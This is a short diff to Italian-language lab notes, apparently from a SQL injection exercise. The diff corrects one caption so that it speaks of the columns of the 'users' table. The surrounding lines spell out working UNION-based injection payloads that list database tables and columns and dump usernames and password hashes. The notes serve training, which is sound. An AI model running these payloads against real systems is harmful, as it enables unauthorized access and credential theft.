@@ -5,7 +5,7 @@ per utilizzare lo script bisogna prima modificare la lunghezza massima dei carat
 # Screen_3:
 utilizzando questa query %' and 1=0 union select null, table_name from information_schema.tables # in SQL Injection possiamo vedere tutte le tabelle presenti
 # Screen_4:
-utilizzando questa query %' and 1=0 union select table_name, column_name from information_schema.columns where table_name = 'users' # possiamo vedere tutte le tabelle che hanno come nome users
+utilizzando questa query %' and 1=0 union select table_name, column_name from information_schema.columns where table_name = 'users' # possiamo vedere tutte le colonne presenti nella tabella users
 # Screen_5:
 utilizzando questa query 1' union select user, password from users# possiamo vedere tutti gli username e password degli utenti solo che lo password sono sottoforma di hash
 # Screen_6:
